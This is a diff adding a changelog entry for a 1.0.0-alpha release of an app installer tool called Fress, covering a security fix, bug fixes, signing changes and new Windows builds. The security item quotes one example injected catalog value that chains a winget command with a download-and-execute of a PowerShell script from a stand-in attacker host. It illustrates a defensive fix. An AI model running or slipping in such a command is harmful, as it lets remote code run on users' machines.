@@ -1,5 +1,30 @@
 # Changelog
 
+## 1.0.0-alpha (2026-09-22)
+
+The trust release: a security hole closed, seven bug fixes, Windows ARM64 and a portable build, and a distribution policy that gives antivirus engines and users a reason to believe the binaries.
+
+### Security
+- Closed a command-injection chain between Import Catalog and Batch Install. A crafted "catalog backup" could carry entries like `"wingetCommand": "winget install VLC; irm evil.example/x.ps1 | iex"`, and Batch Install would paste the payload straight into the generated script. Every install command now passes a shared checker (src/lib/installCommands.ts) at all three borders: the add-app form refuses unsafe input with a visible error, imports strip unsafe commands and say how many they removed, and script generation filters again as a last line of defense. Only plain single `winget install` / `brew install` / `flatpak install` / `scoop install` invocations survive — chaining, pipes, substitution, redirection and quotes all fail the check.
+
+### Fixed
+- Duplicate downloads no longer produce mangled names: the collision handler appended a second dot (`MyApp (1)..exe`) and a trailing dot for extension-less files (src-tauri).
+- Non-ASCII filenames from `Content-Disposition: filename*=UTF-8''...` are now percent-decoded per RFC 5987, so files save with their real names instead of literal `%E6%97%A5...` (src-tauri).
+- The command palette can no longer land on a stale row when the app list changes while it is open; Enter and the highlight always resolve to a real entry.
+- Batch Install no longer hands over an empty script silently: Copy/Download are disabled per package-manager tab until that tab has actual commands, and a note states "N of M selected apps have no {package manager} package" whenever anything is skipped.
+- The GitHub rate-limit pause now expires: after a 403/429 the app backs off until `x-ratelimit-reset` (or one hour) and then resumes live star fetches, instead of staying dry for the whole session.
+- The star cache now evicts entries older than 30 days as documented (was an accidental 7.5 days).
+
+### Changed
+- Windows signing no longer generates a throwaway self-signed certificate per release. CI reuses one persistent certificate provided as a repository secret (WINDOWS_PFX_B64 + WINDOWS_PFX_PASSWORD), so every build carries the same publisher signature and can accumulate real reputation. Azure Trusted Signing remains the preferred path when configured.
+- The Android signing keystore is now also persistent via a repository secret (ANDROID_KEYSTORE_B64) — a fresh keystore per release silently broke update-over-install for existing users.
+- Release binaries are built unstripped (`strip = false`): stripped Windows binaries are a known trigger for Microsoft's machine-learning false positives (Trojan:Win32/Bearfoos.A!ml).
+- Fress is distributed exclusively through GitHub Releases on this repository, always alongside SHA256SUMS.txt. No third-party file hosts. A VirusTotal scan step attaches analysis links to each release when a VIRUSTOTAL_API_KEY secret is configured.
+
+### Added
+- Windows portable build: `Fress_*_x64-portable.zip` — a single exe that runs without installing (WebView2 runtime required, preinstalled on Windows 10/11).
+- Windows ARM64 builds for newer devices: `Fress_*_arm64-setup.exe` installer and `Fress_*_arm64-portable.zip`, produced on every release from now on.
+
 ## 1.0.5-beta (2026-09-22)
 
 The "replace it" release: ente's PrivacyPack is now a full tab of its own, with the downloader the pack never had and a security grade on every option.
